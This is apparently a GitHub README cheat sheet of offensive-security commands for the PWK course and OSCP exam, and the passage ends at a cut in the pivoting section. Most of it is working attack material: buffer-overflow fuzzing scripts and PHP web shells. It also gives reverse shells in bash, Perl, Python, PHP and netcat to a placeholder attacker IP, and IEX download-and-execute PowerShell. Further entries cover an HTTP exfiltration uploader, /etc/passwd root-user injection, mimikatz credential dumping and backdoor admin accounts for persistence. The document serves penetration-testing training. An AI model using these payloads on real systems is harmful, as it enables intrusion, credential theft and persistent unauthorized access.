# JustTryHarder

A cheat sheet to aid you through the PWK course & the OSCP Exam.

*(Inspired by [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings))*

Feel free to submit a Pull Request & leave a star if this helped you.

> **Disclaimer:** None of the below includes spoilers for the PWK labs / OSCP Exam.

### Credits

I have obtained a lot of this info through other GitHub repos, blogs, sites and more. I have tried to give as much credit to the original creator as possible. If I have not given you credit, please contact me on Twitter: [@s1nfulz](https://twitter.com/s1nfulz)

---

## Table of Contents

- [Enumeration](#enumeration)
  - [Determining OS via Ping](#determining-os-via-ping)
  - [Port Scanning](#port-scanning)
  - [Ping Sweep](#ping-sweep)
  - [DNS Zone Transfers](#dns-zone-transfers)
  - [SMB Enumeration](#smb-enumeration)
  - [SMTP Enumeration](#smtp-enumeration)
  - [SNMP Enumeration](#snmp-enumeration)
  - [Web Scanning](#web-scanning)
  - [Show Listening Ports](#show-listening-ports)
  - [Random Enumeration Resources](#random-enumeration-resources)
- [Exploitation](#exploitation)
  - [Buffer Overflow (BOF)](#buffer-overflow-bof)
  - [LFI / RFI](#lfi--rfi)
  - [SQL Injection](#sql-injection)
  - [XSS (Cross-Site Scripting)](#xss-cross-site-scripting)
  - [Kerberoasting](#kerberoasting)
  - [ICMP Injection](#icmp-injection)
  - [Responder / NTLM Relay](#responder--ntlm-relay)
  - [Phishing / 2FA Bypass](#phishing--2fa-bypass)
  - [WordPress](#wordpress)
- [Shells & Payloads](#shells--payloads)
  - [Reverse Shells](#reverse-shells)
  - [Web Shells](#web-shells)
  - [Shell Upgrading](#shell-upgrading)
  - [Payload Generation (msfvenom)](#payload-generation-msfvenom)
  - [Spawning a Windows Shell Binary](#spawning-a-windows-shell-binary)
- [File Transfers](#file-transfers)
  - [SMB Transfer](#smb-transfer)
  - [Wget Transfer](#wget-transfer)
  - [TFTP Transfer](#tftp-transfer)
  - [NetCat Transfer](#netcat-transfer)
  - [PowerShell Download](#powershell-download)
  - [Base64 Transfer](#base64-transfer-linux-to-linux)
  - [Certutil](#certutil)
  - [HTTP File Upload (Exfiltration)](#http-file-upload-exfiltration)
  - [File Transfer Resources](#file-transfer-resources)
- [Password Cracking](#password-cracking)
  - [Hashcat](#hashcat)
  - [John The Ripper](#john-the-ripper)
  - [Password Spraying (CrackMapExec)](#password-spraying-crackmapexec)
  - [Password Cracking Resources](#password-cracking-resources)
- [Privilege Escalation](#privilege-escalation)
  - [Linux Privilege Escalation](#linux-privilege-escalation)
  - [Windows Privilege Escalation](#windows-privilege-escalation)
  - [Kernel Exploits](#kernel-exploits)
- [Post Exploitation](#post-exploitation)
  - [Mimikatz](#mimikatz)
  - [Windows Post Exploitation Commands](#windows-post-exploitation-commands)
  - [Windows Persistence](#windows-persistence)
  - [SMB with Impacket](#smb-with-impacket)
  - [Whoami on Windows XP](#whoami-on-windows-xp)
- [Pivoting & Port Forwarding](#pivoting--port-forwarding)
  - [Port Forwarding Concepts](#port-forwarding-concepts)
  - [Chisel](#chisel)
  - [SSH Port Forwarding & Pivoting](#ssh-port-forwarding--pivoting)
  - [SOCKS Proxy (PowerShell)](#socks-proxy-powershell)
  - [sshuttle](#sshuttle)
  - [Remote Desktop](#remote-desktop)
- [Useful References](#useful-references)
  - [Web Servers (Quick Setup)](#web-servers-quick-setup)
  - [Breakouts / Environment Escapes](#breakouts--environment-escapes)
  - [Writeable Directories](#writeable-directories)
  - [Metasploit Tips](#metasploit-tips)
  - [Nmap Automation Script](#nmap-automation-script)
  - [Labs & Practice](#labs--practice)
  - [Windows Framework / PowerShell](#windows-framework--powershell)
- [Thank You](#thank-you)

---

## Enumeration

### Determining OS via Ping

```bash
ping 10.10.10.110
64 bytes from 10.10.10.110: icmp_seq=1 ttl=128 time=166 ms
```

The `TTL` value reveals the target OS (subtract from the nearest base to calculate hop count):

| TTL Base | OS | Example |
|---|---|---|
| **64** | Linux / \*nix | TTL=61 means 3 hops |
| **128** | Windows | TTL=127 means 1 hop |
| **254** | Solaris / AIX | TTL=250 means 4 hops |

### Port Scanning

#### TCP

```bash
nmap -vvv -sC -sV -p- --min-rate 2000 10.10.10.10
nmap -sT -p 22,80,110 -A 10.10.10.10
reconnoitre -t 10.10.10.10 -o . --services --quick --hostnames
nc -v -n -z -w1 10.10.10.10 1-10000
```

#### UDP

UDP scans can take hours; `netstat` is a better alternative if you already have a shell.

```bash
nmap -sU --top-ports 10000 10.10.10.10
nmap -sT -sU -p 22,80,110 -A 10.10.10.10
nmap -sT -sU -p- --min-rate 2000 10.10.10.10
```

#### Protocol-Specific Scans

```bash
# SNMP
nmap -p161 -sU 10.10.10.10

# SSH algorithms
nmap --script ssh2-enum-algos 10.10.10.10

# SSL/TLS
nmap -v -v --script ssl-cert,ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,sslv2 10.10.10.10
```

#### Nmap Bootstrap HTML Report

```bash
nmap -oA output --stylesheet nmap-bootstrap.xsl 10.10.10.10
firefox nmap-bootstrap.xsl
```

### Ping Sweep

#### Linux (One-Liners)

```bash
for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &); done
fping -g 192.168.0.1/24
```

#### Linux (Script)

```bash
for i in $(seq 1 255); do
    ping -c1 192.168.125.$i 2>/dev/null 1>&2
    if [[ $? -eq 0 ]]; then
        echo "192.168.125.$i is up"
    fi
done
```

#### Windows (CMD)

```cmd
for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.
```

#### Windows (PowerShell)

```powershell
$ping = New-Object System.Net.Networkinformation.Ping
1..254 | % { $ping.send("10.9.15.$_", 1) | where status -ne 'TimedOut' | select Address | fl * }
```

#### Nmap

```bash
nmap -sP 192.168.0.1-254
```

### DNS Zone Transfers

```bash
host -t axfr domain.local 10.10.10.10
host -l domain.local 10.10.10.10
dig @10.10.10.10 domain.local axfr
```

### SMB Enumeration

```bash
smbmap -H 10.10.10.10
smbclient -L 10.10.10.10
smbclient //10.10.10.10/share$
```

- [0xdf - SMB Enumeration Checklist](https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html)

### SMTP Enumeration

- [SMTP Commands Reference](https://github.com/s0wr0b1ndef/OSCP-note/blob/master/ENUMERATION/SMTP/smtp_commands.txt)

### SNMP Enumeration

```bash
nmap -p161 -sU -iL ips.txt
snmpwalk -c public -v1 10.10.10.10
onesixtyone -c community.txt -i ips.txt
```

### Web Scanning

#### GoBuster

```bash
# Linux/Apache
gobuster dir -e -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,js,txt,jsp,pl -s 200,204,301,302,307,403,401

# Windows/IIS
gobuster dir -e -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,js,txt,asp,aspx,jsp,bak -s 200,204,301,302,307,403,401

# HTTPS
gobuster dir -k -u https://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 69
```

#### Dirsearch

```bash
# Linux/Apache
python3 dirsearch.py -r -u http://10.10.10.10/ \
  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,jsp,pl -t 50

# Windows/IIS
python3 dirsearch.py -r -u http://10.10.10.10/ \
  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,asp,aspx,jsp,bak -t 50
```

#### Nikto

```bash
nikto -h 10.10.10.10 -p 80    # HTTP
nikto -h 10.10.10.10 -p 443   # HTTPS
```

#### WFuzz

```bash
wfuzz -u http://10.10.10.10/page.php?dir=../../../../../../../../../FUZZ%00 \
  -w /usr/share/wfuzz/wordlist/general/common.txt
```

### Show Listening Ports

```bash
# Linux
netstat -tulpn | grep LISTEN

# FreeBSD / macOS
netstat -anp tcp | grep LISTEN
netstat -anp udp | grep LISTEN

# OpenBSD
netstat -na -f inet | grep LISTEN

# Nmap (local)
sudo nmap -sT -O localhost        # TCP
sudo nmap -sU -O 192.168.2.13     # UDP
```

### Random Enumeration Resources

- [0daysecurity - Enumeration](http://0daysecurity.com/penetration-testing/enumeration.html)
- [Jok3rSecurity Cheat Sheet](https://jok3rsecurity.com/cheat-sheet/)
- [ADSecurity](https://adsecurity.org/)

---

## Exploitation

### Buffer Overflow (BOF)

Typical bad characters: `0x00`, `0x0A`, `0x0D`

**General Steps:**

1. Fuzzing - send increasing buffers to find crash point
2. Finding EIP offset - use `pattern_create` / `pattern_offset`
3. Controlling EIP - verify with `B` characters at the offset
4. Finding bad characters - send all bytes `\x01`-`\xFF` and check for mangling
5. Locating `jmp esp` - find a reliable return address with `!mona jmp -r esp`
6. Generating payload with `msfvenom` (excluding bad chars)
7. Getting a reverse shell

#### Fuzzer Script

```python
#!/usr/bin/python
import time, struct, sys
import socket as so

buff = ["A"]
max_buffer = 4000
counter = 100
increment = 100

while len(buff) <= max_buffer:
    buff.append("A" * counter)
    counter = counter + increment

for string in buff:
    try:
        server = str(sys.argv[1])
        port = int(sys.argv[2])
    except IndexError:
        print("[+] Usage: python %s <IP> <PORT>" % sys.argv[0])
        sys.exit()
    print("[+] Attempting to crash at %s bytes" % len(string))
    s = so.socket(so.AF_INET, so.SOCK_STREAM)
    try:
        s.connect((server, port))
        s.send((string + '\r\n').encode())
        s.close()
    except:
        print("[+] Connection failed. Check IP/port or debugger.")
        sys.exit()
```

#### EIP Offset Verification

Use `msf-pattern_create -l <length>` to generate a pattern, send it, then find the offset with `msf-pattern_offset -q <EIP_value>`.

```python
#!/usr/bin/python
import sys
import socket as so

# Replace with pattern from: msf-pattern_create -l 500
pattern = "Aa0Aa1Aa2Aa3..."

try:
    server = str(sys.argv[1])
    port = int(sys.argv[2])
except IndexError:
    print("[+] Usage: python %s <IP> <PORT>" % sys.argv[0])
    sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
s.connect((server, port))
s.send((pattern + '\r\n').encode())
s.close()
```

#### Offset Control Verification

Once you know the offset (e.g., 251), verify EIP control:

```python
buffer = "A" * 251 + "B" * 4 + "C" * 90
```

If EIP = `42424242` (BBBB), you control it.

**BOF Resources:**

- [NCC Group - Writing Exploits for Win32](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/)
- [Corelan - Exploit Writing Tutorial Part 1](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
- [dostackbufferoverflowgood](https://github.com/justinsteven/dostackbufferoverflowgood)
- [VeteranSec - 32-bit Windows BOF Made Easy](https://veteransec.com/2018/09/10/32-bit-windows-buffer-overflows-made-easy/)
- [LiveOverflow - Binary Exploitation](https://liveoverflow.com/)
- [0xRick - Binary Exploitation](https://0xrick.github.io/binary-exploitation/bof5/)
- [Exploit Education](https://exploit.education/) - Protostar (32-bit) and Phoenix (64-bit)

*Full credit for the BOF POC scripts: [jessekurrus/brainpan](https://github.com/jessekurrus/brainpan)*

### LFI / RFI

#### PHP Shells for LFI/RFI

```php
<?php phpinfo(); ?>
<?php echo shell_exec(whoami); ?>
<?php system($_GET['cmd']); ?>
<?php echo assert($_GET['cmd']); ?>
```

#### PHP Reverse Shell via LFI

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'"); ?>
```

**LFI/RFI Resources:**

- [FuzzDB LFI Payloads](https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI)
- [Total OSCP Guide - LFI](https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html)
- [HighOn.Coffee - LFI Cheat Sheet](https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method)
- [FuzzySecurity LFI Scripts](http://www.fuzzysecurity.com/scripts/16.html)

### SQL Injection

#### MSSQL xp_cmdshell

```sql
EXEC master..xp_cmdshell 'whoami';
' exec master..xp_cmdshell 'whoami' --
```

#### SQLmap

```bash
sqlmap -u "http://example.com/test.php?test=test" --level=5 --risk=3 --batch
```

**SQL Injection Resources:**

- [OSCP-2 SQL Injection Cheatsheet](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md)
- [PentestMonkey SQLi Cheat Sheet](http://pentestmonkey.net/category/cheat-sheet/sql-injection)

### XSS (Cross-Site Scripting)

#### Basic Payloads

```html
<script>alert(1)</script>
<sCrIpT>alert(1)</script>
<img src=x onerror=alert(3)>
```

#### DOM-Based XSS (input tag)

```
" autofocus onfocus="alert(3)
```

#### XSS in href Attribute

```
javascript:alert(document.cookie)
```

#### SVG-Based XSS

```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">alert(document.location);</script>
</svg>
```

#### Bypass XSS Filters

- [JSFuck](http://www.jsfuck.com/) - Encode JS payloads using only `[]()!+` characters
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) - Generate custom payloads

### Kerberoasting

```bash
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <domain/user>

# PowerShell (Invoke-Kerberoast)
powershell.exe -NoP -NonI -Exec Bypass IEX \
  (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1'); \
  Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat

# Dump NTLM hashes
impacket-secretsdump -just-dc-ntlm <DOMAIN>/<USER>@<DC_IP> -outputfile hashes.txt
```

### ICMP Injection

```bash
# On target
ping -n 3 10.10.10.10

# On attacker (verify)
tcpdump -i tun0 icmp
```

### Responder / NTLM Relay

```bash
responder -I tun0 -wrF
```

- [Responder with NTLM Relay and Empire](https://chryzsh.gitbooks.io/darthsidious/content/execution/responder-with-ntlm-relay-and-empire.html)
- [Practical Guide to NTLM Relaying](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

### Phishing / 2FA Bypass

- [Modlishka](https://github.com/drk1wi/Modlishka) - Reverse proxy for phishing with 2FA bypass
- [Evilginx2](https://github.com/kgretzky/evilginx2) - Man-in-the-middle attack framework for phishing
- [Modlishka 2FA Bypass Guide](https://medium.com/@kalilinux.in/modlishka-advanced-phishing-bypass-two-factor-authentication-234803791a2a)

### WordPress

- [WPScan](https://github.com/wpscanteam/wpscan) - WordPress vulnerability scanner
- `wpscan --url http://10.10.10.10 --enumerate u,vp,vt`
- [Top Hat Sec - WordPress Pentesting](https://forum.top-hat-sec.com/index.php?topic=5758.0)

---

## Shells & Payloads

### Reverse Shells

#### Linux

```bash
# Bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

# Perl
perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat
nc -e /bin/sh 10.10.10.10 4444

# Netcat (named pipes, if -e not available)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 4444 >/tmp/f
```

**Resources:**

- [PentestMonkey - Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [RevShells.com](https://www.revshells.com/) - Online reverse shell generator

#### Windows

```cmd
nc 10.10.10.10 4444 -e cmd.exe
```

- [Windows PHP Reverse Shell](https://github.com/Dhayalanb/windows-php-reverse-shell)

### Web Shells

- [PHPBash](https://github.com/Arrexel/phpbash)
- [p0wny-shell](https://github.com/flozz/p0wny-shell)

### Shell Upgrading

#### Python TTY Upgrade

```bash
# 1. Spawn a PTY
python -c 'import pty; pty.spawn("/bin/bash")'
# (or python3)

# 2. Background the shell
# Press Ctrl-Z

# 3. On your local terminal
stty raw -echo
fg

# 4. Back in the reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

#### Socat Full TTY

**Listener:**

```bash
socat file:$(tty),raw,echo=0 tcp-listen:4444
```

**Victim:**

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```

#### Other Quick Shell Escapes

```bash
perl -e 'exec "/bin/sh";'
/bin/sh -i
```

### Payload Generation (msfvenom)

#### List All Payloads

```bash
msfvenom -l payloads
```

#### Binary Payloads

```bash
# Linux ELF
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf

# Windows EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

#### Web Payloads

```bash
# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```

#### Scripting Payloads

```bash
# Python
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl
```

#### Shellcode

```bash
# See all output formats
msfvenom --help-formats

# Linux shellcode
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f <language>

# Windows shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f <language>
```

#### Metasploit Handler

```
use exploit/multi/handler
set PAYLOAD <payload_name>
set LHOST <IP>
set LPORT <PORT>
set ExitOnSession false
exploit -j -z
```

Quick launch: `msfconsole -L -r handler.rc`

**Payload Types:**

| Type | Description | Example |
|---|---|---|
| **Non-staged** | Full payload in one shot | `shell_reverse_tcp` (works with `netcat`) |
| **Staged** | Payload delivered in parts | `shell/reverse_tcp` (requires `multi/handler`) |

**Resources:**

- [NETSEC - Creating Payloads](https://netsec.ws/?p=331)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [ShellPop](https://github.com/0x00-0x00/ShellPop)

### Spawning a Windows Shell Binary

Compile a simple binary that spawns `cmd.exe` (useful for privilege escalation via writable service paths, etc.):

```c
#include <stdlib.h>

int main() {
    system("C:\\Windows\\System32\\cmd.exe");
}
```

Cross-compile on Linux with MinGW:

```bash
apt install mingw-w64
x86_64-w64-mingw32-gcc pwn.c -o pwn.exe
```

---

## File Transfers

### SMB Transfer

On the victim machine (Windows):

```cmd
net use x: \\10.10.10.10\myshare
copy whatever.zip x:
```

### Wget Transfer

Place the file in `/var/www/html/` and start Apache:

```bash
service apache2 start
```

On the remote server:

```bash
wget http://10.10.10.10/file.bin             # Single file
wget -r http://10.10.10.10/directory/        # Entire directory
```

### TFTP Transfer

Kali to Windows via Metasploit:

```
use auxiliary/server/tftp
set TFTPROOT /usr/share/mimikatz/Win32/
run
```

On the Windows target:

```cmd
tftp -i 10.10.10.10 GET mimikatz.exe
```

### NetCat Transfer

```bash
# Sender (Windows)
nc -nv 10.10.10.10 4444 < file.zip

# Receiver (Linux)
nc -nlvp 4444 > file.zip
```

### PowerShell Download

Interactive session:

```powershell
Invoke-WebRequest -Uri http://10.10.10.10/exploit.py -OutFile C:\Users\Victim\exploit.py
```

Non-interactive (create `wget.ps1`):

```powershell
$client = New-Object System.Net.WebClient
$url = "http://10.10.10.10/file.txt"
$path = "C:\path\to\save\file.txt"
$client.DownloadFile($url, $path)
```

### Base64 Transfer (Linux to Linux)

On the local host:

```bash
cat /path/to/exploit.py | base64 > encoded.b64
```

Transfer `encoded.b64` to the remote server, then decode:

```bash
cat encoded.b64 | base64 -d > exploit.py
```

### Certutil

```cmd
certutil.exe -urlcache -split -f "http://10.10.10.10/file.zip" file.zip
```

### HTTP File Upload (Exfiltration)

**1. Create `upload.php`** on your attacker web root (`/var/www/html/`):

```php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

**2. Create the uploads directory:**

```bash
sudo mkdir /var/www/uploads && sudo chown www-data:www-data /var/www/uploads
```

**3. Upload from victim (PowerShell):**

```powershell
powershell.exe -exec unrestricted -noprofile -Command \
  "(New-Object System.Net.WebClient).UploadFile('http://10.10.10.10/upload.php', 'file-to-upload.txt')"
```

### File Transfer Resources

- [Nakkaya - NetCat File Transfers](https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/)
- [isroot.nl - Post-Exploitation File Transfers on Windows](https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/)
- [ropnop - Transferring Files from Kali to Windows](https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb)
- [0xdf - Windows File Transfers](https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html)
- [JollyFrogs - Transfer Files to Windows](https://www.jollyfrogs.com/transfer-files-windows/)

---

## Password Cracking

### Hashcat

```bash
hashcat -m 500 -a 0 -o cracked.txt --force hash.txt /path/to/wordlist.txt
```

- [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) - Find the `-m` mode number for your hash type

### John The Ripper

```bash
john --rules --wordlist=/path/to/wordlist.txt hash.txt
```

- [Cracking Everything with John the Ripper](https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c)

### Password Spraying (CrackMapExec)

```bash
cme smb 10.10.10.10 -u username -d domain -p password
```

A small season/month wordlist (`wordlists/English-dates.txt`) is included in this repo for spraying common patterns like `Spring2021`, `Summer2020`, etc.

### Password Cracking Resources

- [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [Hashcat NTLM Brute Force](https://cyberloginit.com/2017/12/26/hashcat-ntlm-brute-force.html)
- [HashID - Identify Hash Types](http://mattw.io/hashID/types)
- [HashKiller](https://hashkiller.co.uk/Cracker)
- [CrackStation](https://crackstation.net)
- [Hydra Web Auth Dictionary Attack](https://insidetrust.blogspot.com/2011/08/using-hydra-to-dictionary-attack-web.html)
- [naive-hashcat](https://github.com/brannondorsey/naive-hashcat)

---

## Privilege Escalation

### Linux Privilege Escalation

> **Tip:** If GCC and wget are installed on the target, it may be vulnerable to a kernel exploit.

#### Enumeration Commands

```bash
grep -Ri 'password' .
find / -perm -4000 2>/dev/null
find / -perm -u=s 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
```

#### Privilege Escalation via /etc/passwd

If you have write access to `/etc/passwd`:

```bash
# Generate a password hash
openssl passwd mrcake
# Output: WVLY0mgH0RtUI

# Add a root-level user
echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd

# Switch to the new user
su root2
# Password: mrcake
```

#### Custom SUID Binary

Requires code execution as the target user (e.g., via MySQL `sys_eval` running as root):

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
    setuid(geteuid());
    system("/bin/bash");
    return 0;
}
```

#### NFS Privilege Escalation

If NFS shares are misconfigured with `no_root_squash`, you can mount the share and create SUID binaries.

- [NFS Privilege Escalation](https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/)
- [LD_PRELOAD Privilege Escalation](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)

#### Linux Priv Esc Tools & Resources

- [GTFOBins](https://gtfobins.github.io) - Break out of restricted shells / abuse SUID binaries
  - Helper script: [gtfo](https://github.com/dreadnaughtsec/gtfo)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
- [pspy](https://github.com/DominicBreuker/pspy) - Monitor processes without root
- [unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
- [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
- [g0tmi1k - Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [Linux Priv Esc via sudo](http://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/)

### Windows Privilege Escalation

#### Quick Wins

```cmd
churrasco -d "net user /add <username> <password>"
churrasco -d "net localgroup administrators <username> /add"
churrasco -d "NET LOCALGROUP \"Remote Desktop Users\" <username> /ADD"
```

#### Checking for Stored Credentials

```cmd
cmdkey /list
runas /user:DOMAIN\Administrator /savecred "cmd.exe"
```

#### Checklist

1. Check if PowerShell is installed (`C:\Windows\System32\WindowsPowerShell`)
2. Run PowerUp or other enumeration scripts
3. Check for kernel exploits (use Windows Exploit Suggester)
4. Inspect Program Files for outdated / vulnerable software
5. Check `cmdkey /list` for stored credentials

#### Windows Priv Esc Tools & Resources

- [FuzzySecurity - Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
- [absolomb - Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [PowerUp / PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
- [Powerless](https://github.com/M4ximuss/Powerless) - Windows enumeration (no PowerShell needed)
- [JAWS](https://github.com/411Hall/JAWS) - Just Another Windows Enum Script
- [Watson](https://github.com/rasta-mouse/Watson) - .NET-based patch enumeration
- [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
- [Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [Stored Credentials Exploitation](https://pentestlab.blog/2017/04/19/stored-credentials/)

### Kernel Exploits

- [Linux Kernel Exploits](https://github.com/SecWiki/linux-kernel-exploits)
- [lucyoa - Kernel Exploits Collection](https://github.com/lucyoa/kernel-exploits)
- [DirtyCow (Linux)](https://github.com/FireFart/dirtycow)
- [RottenPotatoNG (Windows)](https://github.com/breenmachine/RottenPotatoNG)

---

## Post Exploitation

### Mimikatz

```cmd
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

### Windows Post Exploitation Commands

```cmd
WMIC USERACCOUNT LIST BRIEF
net user
net localgroup Users
net localgroup Administrators
net user USERNAME NEWPASS /add
net user "USER NAME" NEWPASS /add
net localgroup administrators USERNAME /add
```

### Windows Persistence

```cmd
# Add a new user
net user /add hacker 1234567

# Add to Administrators
net localgroup administrators /add hacker

# Add to Remote Desktop Users
net localgroup "Remote Desktop users" hacker /add

# Start Remote Desktop service
net start TermService

# Check if TermService is running
tasklist /svc | findstr /C:TermService

# Enable Terminal Services permanently
sc config TermService start=auto

# Enable via registry (requires reboot)
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

- [SharPersist](https://github.com/fireeye/SharPersist) - C# persistence toolkit
- Metasploit: `use exploit/windows/local/registry_persistence`

*Credit: [s0wr0b1ndef OSCP notes](https://github.com/s0wr0b1ndef/OSCP-note/blob/master/persistence/persistence_windows.txt)*

### SMB with Impacket

#### PSEXEC (Remote Shell)

```bash
/usr/share/doc/python-impacket/examples/psexec.py user@10.10.10.10
```

#### SMB Server (File Transfer)

```bash
cd /usr/share/windows-binaries
python /usr/share/doc/python-impacket/examples/smbserver.py share .
```

On the target:

```cmd
\\10.10.10.10\share\mimikatz.exe
```

### Whoami on Windows XP

Windows XP lacks a built-in `whoami` command. Use the one from Kali:

```bash
# On Kali - start an SMB server
smbserver.py share /usr/share/windows-binaries/
```

```cmd
# On the XP target
\\10.10.14.14\share\whoami.exe
# Output: NT AUTHORITY\SYSTEM
```

If `%username%` doesn't expand, you're likely running as SYSTEM:

```cmd
echo %username%
# If this prints "%username%" literally, you're SYSTEM
```

*Credit: [0xdf - HTB Legacy](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html)*

---

## Pivoting & Port Forwarding

### Port Forwarding Concepts

| Type | Direction | Use Case |
|---|---|---|
| **Local** | Forward local port to remote | Access a remote service locally |
| **Remote** | Forward remote port to local | Expose a local service to the remote machine |
| **Dynamic** | SOCKS proxy | Route arbitrary traffic through the tunnel |

### Chisel

**On your machine (server):**

```bash
./chisel server -p 8080 --reverse
```

**On the victim:**

```bash
./chisel client YOUR_IP:8080 R:1234:127.0.0.1:1234
```

### SSH Port Forwarding & Pivoting

**1. Generate an SSH key pair** on the pivot machine:

```bash
ssh-keygen
cat ~/.ssh/id_rsa.pub
```

**2. Add the public key** to `~/.ssh/authorized_keys` on your Kali machine with restrictions:

```
from="[VICTIM_IP]",command="echo 'Port forwarding only'",no-agent-forwarding,no-X11-forwarding,no-pty [PUBLIC_KEY]
```

**3. Start SSH** on Kali:

```bash
sudo service ssh start
```

**4. Create the tunnel** from the pivot machine:

```bash
